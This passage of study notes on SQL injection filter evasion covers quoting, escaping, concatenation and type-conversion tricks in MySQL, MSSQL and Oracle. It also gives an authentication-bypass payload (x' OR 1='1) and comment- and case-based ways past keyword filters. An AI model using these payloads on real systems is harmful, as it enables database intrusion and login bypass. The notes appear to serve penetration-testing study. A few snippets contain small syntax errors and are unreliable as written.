+</code></pre><p id="8c6ee8cf-46db-401f-a18b-024815d1a9b6" class="">Bit Literals</p><p id="bbd1364a-656f-4a09-9c41-1c37a34a8ccb" class="">→ https://dev.mysql.com/doc/refman/5.7/en/bit-value-literals.html</p><p id="b6f0a145-e28d-4fe7-b870-3f65a36630b3" class="">Using like B’literal’ or b’literal’:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16e58904-030a-471b-bdef-a5bcc9301616" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;a&#x27;=B&#x27;1100001&#x27; #TRUE
+</code></pre><h3 id="2d8ee00d-dd8a-4bbb-b0ea-56337bde7b5f" class=""><strong>MSSQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#mssql-2"></a></strong></h3><p id="ce44c86b-f9fe-477d-b8e9-0044c6345547" class="">It defines the literal as either constant or scalar value.</p><ul id="9df8c372-6e6a-4132-9a94-3eae9cb51377" class="bulleted-list"><li style="list-style-type:disc">can be defined only by using single quotes (<strong>’ ‘</strong>)</li></ul><p id="95b0d713-a672-4816-afeb-07a60e0aecac" class="">If the QUOTED_IDENTIFIER options is enabled, then we can use double quotes (<strong>” “</strong>)</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="78d3c77d-1fbd-46d3-bcf7-555118c22bef" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;Hello&#x27;
+</code></pre><h3 id="4416d016-722a-4ca1-9499-5d68e421fcc6" class=""><strong>OrACLE</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#oracle-3"></a></strong></h3><p id="5742c864-96a3-4dfe-8bb8-9095888bfbf2" class="">Also does not allow double quotes. But we can use National notation → https://docs.oracle.com/cd/B28359_01/server.111/b28286/sql_elements003.htm#SQLRF00218</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0ce8578b-c90a-469d-8b5b-ece6169beb25" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;Hello&#x27;
+SELECT N&#x27;Hello&#x27;
+SELECT q&#x27;[Hello]&#x27;
+SELECT Q&#x27;{Hello}&#x27;
+SELECT nQ&#x27;(&quot;admin&quot;)&#x27;
+</code></pre><h3 id="bfbfb466-f5bc-4cf8-b984-dd93cda6904f" class=""><strong>Unicode</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#unicode"></a></strong></h3><p id="2d55aff7-a93c-429b-840b-afb0829233ef" class="">MYSQL:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="58566ff1-b559-4b57-8f85-2d94ba51bab9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://dev.mysql.com/doc/refman/5.5/en/charset-collation-effect.html
+
+Documented above:
+SELECT &#x27;admin&#x27;=&#x27;âđɱȋň&#x27; #TRUE
+</code></pre><h3 id="57bc7939-3f8b-4275-b8f8-0065be8d2327" class=""><strong>Escaping</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#escaping"></a></strong></h3><p id="c1802d92-c6ae-4924-9ab7-b75b1f59c7bf" class="">Using backslash before both single and double quotes</p><p id="1c2ae876-aa20-4ee4-88aa-9fd5685b8579" class="">→ https://dev.mysql.com/doc/refman/8.0/en/string-literals.html</p><p id="40cddd7a-aea9-49c2-9891-5f0bc21a2f3f" class="">However there are also other special characters used to escapse:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5524bcb3-a059-4901-a87a-f983655c3729" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;He\&#x27;llo&#x27;
+SELECT &#x27;He\%\_llo&#x27;
+</code></pre><p id="5a68d9c9-ef7f-4ca2-b739-7d2c070d2378" class="">Furthermore, to escape quotes we can use the same character two times:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f56a9c7f-d438-449c-ab01-595e225503bd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;He&#x27;&#x27;llo&#x27;
+SELECT &quot;He&quot;&quot;llo&quot;
+</code></pre><p id="eb49e18a-2562-4cbf-9e67-55ac32c1ed5f" class="">If we try to escape a character that does not have a respective escaping sequence, the backslash will be ignored:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f22d8a03-a945-49c8-b8f5-421e66daabeb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;\H\e\l\l\o&#x27;
+SELECT &#x27;He\ll\o&#x27;
+</code></pre><p id="01cbeb15-1afe-4aca-9940-5c75f313df25" class="">In MSSQL and Oracle, u can escape single quotes by using two single quotes:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bac7c4c8-b335-47af-a76a-e880ce6a296a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;He&#x27;&#x27;llo&#x27;
+</code></pre><h3 id="9397f794-2f4e-432f-b40c-f8e554604865" class=""><strong>Concatenation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#concatenation"></a></strong></h3><p id="7aba875f-d52d-4ed7-8da3-c1c5af5010ef" class="">For quoted strings, concatenation can be performed by placing the string next to each other:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d25297e7-e5c4-4b35-a2d8-1d49114ff94d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;he&#x27; &#x27;ll&#x27; &#x27;o&#x27;
+</code></pre><p id="1a472ed2-8190-4252-a0bf-e1c6ea2f63d9" class="">As an alternative, we can use functions like CONCAT and CONCAT_WS</p><p id="18790128-dcb3-4d23-b666-dfae9fb56c32" class="">→ http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_concat</p><p id="5e513b64-f0b7-42fb-9fa7-6752913f443b" class="">→ http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_concat-ws</p><p id="781f9624-5640-4c32-97ac-c8267c92c879" class="">WS stand For <strong>with separator</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cf7d181e-bf8d-4cf3-9f5f-9efa79ba62a4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT CONCAT(&#x27;He&#x27;,&#x27;ll&#x27;,&#x27;o&#x27;)
+SELECT CONCAT_WS(&#x27;&#x27;. &#x27;He&#x27;, &#x27;ll&#x27;, &#x27;o&#x27;)
+</code></pre><p id="8573deb0-2745-4f86-a50d-2fea956d1ad6" class="">Its possible to concatenate using mix of comments in C-Style:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="156fc32d-ce07-4c56-b7dc-3694c536edcf" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;He&#x27;/**/&#x27;ll&#x27;/**/&#x27;o&#x27;
+SELECT /**/&#x27;He&#x27;/**/&#x27;ll&#x27;/**/&#x27;o&#x27;/**/
+SELECT /*!10000 &#x27;He&#x27; */&#x27;ll&#x27;/*****/&#x27;o&#x27;/*****/
+</code></pre><p id="ce8bf93e-ca85-4d3d-94ea-62f39067ca1f" class="">in MSSQL: Can be done by using both the operator (+) and the function CONCAT → http://msdn.microsoft.com/en-us/library/hh231515.aspx</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="13b9aef1-2762-48ed-849d-d4768d93c64d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;He&#x27;+&#x27;ll&#x27;+&#x27;o&#x27;
+SELECT CONCAT(&#x27;He&#x27;,&#x27;ll&#x27;,&#x27;o&#x27;)
+</code></pre><p id="c95f6fae-eeac-4bc9-baaf-9a0d26437a08" class="">We can obfuscate by using C-Style comments:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="71d544f3-90fd-4370-8580-4bc1bf271242" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;He&#x27;/**/+/**/&#x27;ll&#x27;/**/+&#x27;o&#x27;
+SELECT CONCAT(/**/&#x27;He&#x27;,/**/1/**/,/**/&#x27;lo&#x27;/**/)
+</code></pre><p id="10dbadb9-493f-43a5-b6e2-30ba3ecddc8b" class="">In Oracle: The operator is <strong>||</strong> and, from the function perspective, we can use <strong>CONCAT</strong> and <strong>NVL</strong>:</p><p id="74d01e4e-2aae-4cb8-b346-c297a8290118" class="">→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/functions026.htm#SQLRF00619</p><p id="dc6e619a-dc14-44f8-9a3f-0c9a01e32311" class="">→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/functions110.htm#SQLRF00684</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a4df2eb7-9a24-4042-a3ef-e635f63472d2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT &#x27;He&#x27;||&#x27;ll&#x27;||&#x27;o&#x27;
+SELECT CONCAT(&#x27;He&#x27;,&#x27;llo&#x27;)
+SELECT NVL(&#x27;Hello&#x27;, &#x27;Goodbye&#x27;)
+</code></pre><p id="291e409e-ae26-4d08-ba8c-40d32d7bd37d" class="">Obfuscating the string concatenation:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3747efec-258f-4cc8-a617-e6c5c771a0e2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT q&#x27;[]&#x27;||&#x27;He&#x27;||&#x27;ll&#x27;/**/&#x27;o&#x27;
+SELECT CONCAT(/**/&#x27;He&#x27;/**/,/**/&#x27;ll&#x27;/**/)
+</code></pre><p id="e3b54576-c283-480a-b6c2-284ddca06f43" class="">Integers:</p><ul id="462893f1-4d7c-4cf0-97ff-1928927178b1" class="bulleted-list"><li style="list-style-type:disc">Example is to use the value PI (3,141593…). With FLOOR to obtain the value 3, and CEIL to obtain the value 4</li></ul><ul id="f83ec11a-74d5-4e7d-9beb-a9283fe14344" class="bulleted-list"><li style="list-style-type:disc">We can use system function like version() and obtain the value 5,6</li></ul><p id="f28784b6-5724-4c8d-871a-950b43738fd3" class="">For example</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ff1e6a1f-0fe2-4dc5-9125-d99837ac112c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ceil(pi()*3) = 10
+</code></pre><h3 id="efc2c0e8-dce6-4d7e-8f7b-18558a53c19c" class=""><strong>MySQL Type Conversion</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#mysql-type-conversion"></a></strong></h3><p id="124c484a-815e-4276-95a2-fda7de6f5ab7" class="">Combining arithmetic operations with different types:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cd0686db-9df2-47a7-90f1-83871becc4f8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT ~&#x27;-2it\&#x27;s a kind of magic&#x27;
+</code></pre><p id="1786c0e2-e60c-4e48-afc0-a5b653ab324b" class="">Numbers vs Booleans:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="63615a31-6115-479a-9c0a-09feb89f28cf" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT ... 1=TRUE
+SELECT ... 2! =TRUE
+SELECT ... OR 1
+SELECT ... AND 1
+</code></pre><p id="b11eeab8-1d4f-4941-ac8c-483e1418201d" class="">Strings vs Numbers vs Booleans:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="762e5bb9-3782-4e79-99f4-deeddc278c79" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT ... VERSION()=5.5 #5.5.30
+SELECT ... @@VERSION()=5.5 #5.5.30
+SELECT ... (&#x27;type&#x27;+&#x27;cast&#x27;)=0 #TRUE
+SELECT ~&#x27;-2it\&#x27;s a kind of mafic&#x27;        &#x27;#1
+SELECT ~&#x27;-1337a kind of magic&#x27;-25 #1337
+</code></pre><p id="065f670a-0379-4876-aaad-9128405ca0dd" class="">Bypassing Authentication:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c33b16fa-5668-4e3c-8374-c6ef96834f15" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Put all of this together and try to think of some alternatives to the classic
+
+x&#x27; OR 1=&#x27;1
+</code></pre><h2 id="64fae2ff-890c-4e8c-98f8-97febc2fa8c3" class=""><strong>Bypassing Keyword Filters</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#bypassing-keyword-filters"></a></strong></h2><p id="916e24fe-dfce-4902-8280-e4aaaa076303" class="">The first limitation are restriction on keywords</p><h3 id="7f2c5daf-0e32-49ca-ae8d-b9638e48e96f" class=""><strong>Case Changing</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#case-changing"></a></strong></h3><p id="12c3d4f4-3730-482a-b9ce-61542f18a2d0" class="">The simplest is just change the cases of each character:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d219c4d5-52b5-4731-b3a5-4f2ab5db2784" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SeLeCt
+SEleCT
+etc
+</code></pre><p id="cd3df2ff-b43d-4a79-926f-435e19e70e5c" class="">sqlmap has a tampering script to automate this case changing</p><p id="c568a3e4-8256-4d7a-ac8d-b512fc621364" class="">→ https://github.com/sqlmapproject/sqlmap/blob/master/tamper/randomcase.py</p><h3 id="e80fda0d-769a-4b91-a819-59c421dbdf18" class=""><strong>Using Intermediary Characters</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#using-intermediary-characters"></a></strong></h3><p id="af993dab-b268-45bc-b27e-389a64f5f2a0" class="">We can use both comments instead of spaces and depending on the DBMS version, a list of the whitespace that are not matched as spaces:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ed87acb8-3dd5-4688-a801-46b322b619d2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT/**/values/**/and/**/.../**/or/**/
+SELECT[sp]values[sp]and...[sp]or[sp]
+</code></pre><h3 id="ada10a93-f2a2-4da3-bd0b-e4f7409cce15" class=""><strong>Using alternative Techniques</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#using-alternative-techniques"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="afbb5607-49fd-4d11-acaa-748336e7003f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT&quot;values&quot;from&#x27;table&#x27;where/**/1
+SELECT(values)from(table)where(1)
+SELECT&quot;values&quot;&#x27;&#x27;from&#x27;table&#x27;where(1)
+SELECT+&quot;values&quot;%A0from&#x27;table&#x27;
